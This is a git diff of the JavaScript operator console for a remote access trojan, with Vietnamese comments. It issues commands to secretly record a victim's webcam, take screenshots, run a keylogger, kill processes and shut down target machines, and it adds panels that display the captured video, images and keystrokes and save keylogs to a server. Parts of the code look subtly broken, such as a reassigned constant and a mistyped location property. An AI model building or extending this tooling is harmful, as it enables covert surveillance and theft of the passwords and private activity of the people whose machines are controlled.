@@ -1,6 +1,16 @@
 import { CONFIG } from './modules/config.js';
 import { Gateway } from './modules/gateway.js';
 
+const urlParams = new URLSearchParams(window.search);
+const targetParam = urlParams.get('target');
+
+if (targetParam) {
+    setTimeout(() => {
+        window.setTarget(targetParam);
+        ui.log("System", "Đã tự động kết nối tới Agent từ tab mới");
+    }, 2000);
+}
+
 const appState = {
     isConnected: false,
     sessionId: null,
@@ -25,173 +35,176 @@ const ui = {
     }
 };
 
-const gateway = new Gateway({
-    onConnected: () => {
-        ui.log("System", "Đã kết nối tới Gateway! Vui lòng gọi `auth()` để đăng nhập.");
-        appState.isConnected = true;
-    },
-    onDisconnected: () => {
-        ui.warn("System", "Mất kết nối Gateway.");
-        appState.isConnected = false;
-        appState.agents = [];
-    },
-    onAuthSuccess: () => {
-         ui.log("System", "Đăng nhập thành công! Đang tải danh sách Agent...");
-    },
+// Export gateway để scripts.js có thể sử dụng
+window.gateway = new Gateway({
     onAgentListUpdate: (agentList) => {
-        ui.log("System", `Cập nhật danh sách Agent: ${agentList.length} thiết bị.`);
         appState.agents = agentList;
-        if (appState.currentTarget !== 'ALL' && !agentList.find(a => a.id === appState.currentTarget)) {
-            ui.warn("System", `Target ${appState.currentTarget} đã offline. Reset về 'ALL'.`);
-            appState.currentTarget = 'ALL';
-            gateway.setTarget('ALL');
+        renderAgentTabs();
+        ui.updateAgentList(gateway.getFormattedAgents());
+        
+        // Cập nhật dashboard nếu đang mở (chỉ khi overlay đang visible)
+        if (typeof window.fetchAndRenderServers === 'function') {
+            const overlay = document.getElementById('server-list-overlay');
+            if (overlay && !overlay.classList.contains('hidden')) {
+                window.fetchAndRenderServers();
+            }
         }
-        ui.updateAgentList(agentList);
     },
     onScreenshot: (base64Data, agentId) => {
-        ui.log("Spy", `Nhận ảnh màn hình từ ${agentId}`);
-        const modal = document.getElementById('image-modal');
-        const img = document.getElementById('modal-img');
-        
-        if (img && modal) {
-            img.src = "data:image/jpeg;base64," + base64Data;
-            modal.classList.remove('hidden');
-            modal.style.display = 'block';
-        } else {
-            console.log("%c[ẢNH]", "font-size: 50px; background-image: url(data:image/jpeg;base64," + base64Data + ")");
+        const container = document.getElementById('preview-area');
+        if (!container) {
+            // Create preview area if it doesn't exist
+            const body = document.body;
+            container = document.createElement('div');
+            container.id = 'preview-area';
+            container.style.cssText = 'padding: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;';
+            body.appendChild(container);
         }
+        
+        const timestamp = new Date().toLocaleString('vi-VN');
+        const wrapper = document.createElement('div');
+        wrapper.className = 'preview-item';
+        wrapper.style.cssText = 'border: 2px solid #4CAF50; border-radius: 8px; padding: 10px; background: #f5f5f5; box-shadow: 0 2px 4px rgba(0,0,0,0.1);';
+        wrapper.innerHTML = `
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <strong style="color: #2196F3;">📷 Screenshot từ ${agentId}</strong>
+                <span style="font-size: 0.8em; color: #666;">${timestamp}</span>
+            </div>
+            <img src="data:image/jpeg;base64,${base64Data}" 
+                 style="width:100%; border-radius: 4px; cursor:pointer; transition: transform 0.2s;" 
+                 onclick="window.open(this.src, '_blank')"
+                 onmouseover="this.style.transform='scale(1.02)'"
+                 onmouseout="this.style.transform='scale(1)'"
+                 alt="Screenshot">
+            <button onclick="this.parentElement.remove()" style="margin-top: 10px; padding: 5px 10px; background: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer;">Xóa</button>
+        `;
+        container.prepend(wrapper);
     },
     onCamera: (videoData, agentId) => {
-        ui.log("Spy", `Nhận video từ ${agentId}, đang tải xuống...`);
-        const link = document.createElement('a');
-        link.href = "data:video/mp4;base64," + videoData;
-        link.download = `cam_${agentId}_${Date.now()}.mp4`;
-        link.click();
+        const container = document.getElementById('preview-area');
+        if (!container) {
+            // Create preview area if it doesn't exist
+            const body = document.body;
+            container = document.createElement('div');
+            container.id = 'preview-area';
+            container.style.cssText = 'padding: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;';
+            body.appendChild(container);
+        }
+        
+        const timestamp = new Date().toLocaleString('vi-VN');
+        const wrapper = document.createElement('div');
+        wrapper.className = 'preview-item';
+        wrapper.style.cssText = 'border: 2px solid #FF9800; border-radius: 8px; padding: 10px; background: #f5f5f5; box-shadow: 0 2px 4px rgba(0,0,0,0.1);';
+        wrapper.innerHTML = `
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                <strong style="color: #FF9800;">🎥 Video từ ${agentId}</strong>
+                <span style="font-size: 0.8em; color: #666;">${timestamp}</span>
+            </div>
+            <video src="data:video/mp4;base64,${videoData}" 
+                   controls 
+                   style="width:100%; border-radius: 4px; background: #000;"
+                   preload="metadata">
+                Trình duyệt của bạn không hỗ trợ video.
+            </video>
+            <button onclick="this.parentElement.remove()" style="margin-top: 10px; padding: 5px 10px; background: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer;">Xóa</button>
+        `;
+        container.prepend(wrapper);
     },
     onKeylog: (keyData, agentId) => {
-        const keylogPanel = document.getElementById('keylog-panel');
-        if (keylogPanel) {
-            keylogPanel.value += keyData;
-            keylogPanel.scrollTop = keylogPanel.scrollHeight;
+        const panel = document.getElementById('keylog-panel');
+        if (panel) {
+            panel.value += keyData;
+            panel.scrollTop = panel.scrollHeight;
         }
-        console.log(`%c[Keylog - ${agentId}]: ${keyData.replace(/\n/g, '\\n')}`, 'color: orange');
-    },
-    onMessage: (msg) => {
-        console.log("Raw Msg: ", msg);
-    },
-    onError: (err) => {
-        ui.error("Main", err);
     }
 });
 
-window.ui = ui; 
-
-window.help = () => {
-    console.clear();
-    console.log("%c=== RAT CONTROL PANEL - HƯỚNG DẪN ===", "color: #fff; background: #8b5cf6; font-size: 16px; padding: 10px; border-radius: 5px; width: 100%; display: block;");
-    
-    console.group("%c1. KẾT NỐI & QUẢN LÝ", "color: #3b82f6");
-    //console.log("connect(ip)       - Kết nối tới server (VD: connect('localhost'))");
-    console.log("getAgentList()    - fetch agent list")
-    console.log("auth()            - Đăng nhập (Bắt buộc sau khi connect)");
-    console.log("scan()            - Quét mạng LAN tìm IP Server");
-    console.log("setTarget('ID')   - Chọn mục tiêu cụ thể (hoặc 'ALL')");
-    console.log("whoami()          - Lấy tên máy của mục tiêu");
-    console.groupEnd();
-
-    console.group("%c2. GIÁN ĐIỆP & THEO DÕI", "color: #ef4444");
-    console.log("screenshot()      - Chụp ảnh màn hình");
-    console.log("recordCam(s)      - Quay lén webcam (s: số giây, mặc định 5)");
-    console.log("startKeylog()     - Bắt đầu nhận keylog");
-    console.log("stopKeylog()      - Dừng keylog");
-    console.groupEnd();
-
-    console.group("%c3. ỨNG DỤNG & TIẾN TRÌNH", "color: #22c55e");
-    console.log("listApps()        - Xem danh sách ứng dụng đã cài");
-    console.log("startApp(id)      - Mở ứng dụng theo ID (lấy từ listApps)");
-    console.log("stopApp(id)       - Tắt ứng dụng theo ID");
-    console.log("listProcs()       - Xem danh sách tiến trình đang chạy");
-    console.log("startProc(id)     - (Ít dùng) Chạy process");
-    console.log("stopProc(id)      - Kill process theo PID");
-    console.groupEnd();
-
-    console.group("%c4. KHÁC", "color: #eab308");
-    console.log("echo('msg')       - Gửi tin nhắn test (hiện popup/log bên agent)");
-    console.log("shutdownAgent()   - Tắt máy nạn nhân");
-    console.log("restartAgent()   - Tắt máy nạn nhân");
-    console.log("help()            - Xem lại bảng này");
-    console.groupEnd();
-    
-    return "Hãy bắt đầu bằng lệnh: connect('localhost')";
+window.searchApps = (query) => {
+    if (query) {
+        gateway.fetchAppList(query);
+    } else {
+        gateway.fetchAppList();
+    }
 };
 
-gateway.connect('10.148.31.96');
+window.searchProcs = (query) => {
+    if (query) {
+        gateway.fetchProcessList(query);
+    } else {
+        gateway.fetchProcessList();
+    }
+};
 
-window.getAgentList = () => {
-    gateway.refreshAgents();
-}
+// Display app/process lists on screen
+window.displayAppList = () => {
+    gateway.fetchAppList();
+};
 
-window.auth = () => {
-    if(!gateway.ws || gateway.ws.readyState !== WebSocket.OPEN) {
-        ui.error("CMD", "Chưa kết nối! Hãy gọi connect('IP') trước.");
+window.displayProcessList = () => {
+    gateway.fetchProcessList();
+};
+
+window.saveKeylogToFile = () => {
+    const panel = document.getElementById('keylog-panel');
+    if (!panel || !panel.value.trim()) {
+        ui.warn('Keylog', 'Không có dữ liệu keylog để lưu');
         return;
     }
-    gateway.authenticate();
+
+    const keylogData = panel.value;
+    
+    // Send to server to save
+    gateway.send(CONFIG.CMD.SAVE_KEYLOG, { data: keylogData });
+    
+    // Also download locally as backup
+    const blob = new Blob([keylogData], { type: 'text/plain;charset=utf-8' });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `keylog_${appState.currentTarget}_${Date.now()}.txt`;
+    link.click();
+    URL.revokeObjectURL(url);
+    
+    // Clear the panel
+    panel.value = "";
+    ui.log('Keylog', 'Đã lưu keylog và xóa dữ liệu trên màn hình');
 };
 
-window.scan = () => {
-    ui.info("[Main] Đang quét mạng (192.168.1.x)...");
-    scanner.scan("192.168.1.", (foundIp) => {
-        ui.log("Scanner", `Tìm thấy server tại: ${foundIp}`);
-        gateway.connect(foundIp);
+window.renderAgentTabs = () => {
+    const container = document.getElementById('agent-selector-ui');
+    if (!container) return;
+    
+    container.innerHTML = "";
+    const agents = gateway.getFormattedAgents();
+    
+    agents.forEach(agent => {
+        const item = document.createElement('div');
+        item.className = 'agent-link';
+        item.style.cursor = 'pointer';
+        item.innerHTML = `<span>${agent["Machine"]} (${agent["IP Address"]})</span>`;
+        item.onclick = () => {
+            const targetUrl = `${window.location.origin}${window.location.pathname}?agent=${agent["ID"]}`;
+            window.open(targetUrl, '_blank');
+        };
+        container.appendChild(item);
     });
 };
 
-window.setTarget = (agentId) => {
-    appState.currentTarget = agentId;
-    gateway.setTarget(agentId);
-    ui.info(`[Control] Đã khóa mục tiêu: ${agentId}`);
-}
-
-// App Control
-window.listApps = () => gateway.fetchAppList();
-window.startApp = (id) => gateway.startApp(id);
-window.stopApp = (id) => gateway.killApp(id);
-
-// Process Control
-window.listProcs = () => gateway.fetchProcessList();
-window.startProc = (id) => gateway.startProcess(id);
-window.stopProc = (id) => gateway.killProcess(id);
-
-// Spy
-window.whoami = () => gateway.send(CONFIG.CMD.WHOAMI, "");
-window.echo = (text) => gateway.send(CONFIG.CMD.ECHO, text);
-window.screenshot = () => gateway.send(CONFIG.CMD.SCREENSHOT, "");
-window.recordCam = (duration = 5) => gateway.send(CONFIG.CMD.CAM_RECORD, String(duration));
-
-// Keylog
-window.startKeylog = () => {
-    ui.info("[CMD] Bật Keylogger...");
-    gateway.send(CONFIG.CMD.START_KEYLOG, JSON.stringify({interval: 0.5}));
-};
-window.stopKeylog = () => {
-    ui.info("[CMD] Tắt Keylogger...");
-    gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
-};
-
-// Power
-window.shutdownAgent = () => {
-    if(confirm("CẢNH BÁO: Bạn chắc chắn muốn tắt máy mục tiêu?")) {
-        gateway.send(CONFIG.CMD.SHUTDOWN, "");
-    }
-}
-
-window.restartAgent = () => {
-    if (confirm("RESTART?")) {
-        gateway.send(CONFIG.CMD.RESTART, "");
-    }
-}
-
 document.addEventListener('DOMContentLoaded', () => {
-    window.help();
+    // Tự động connect đến gateway
+    if (!gateway.isAuthenticated) {
+        gateway.connect(CONFIG.SERVER_HOST, CONFIG.SERVER_PORT);
+    }
+    
+    const params = new URLSearchParams(window.location.search);
+    const autoAgent = params.get('agent');
+    
+    if (autoAgent) {
+        const checkInterval = setInterval(() => {
+            if (gateway.isAuthenticated) {
+                window.setTarget(autoAgent);
+                clearInterval(checkInterval);
+            }
+        }, 500);
+    }
 });
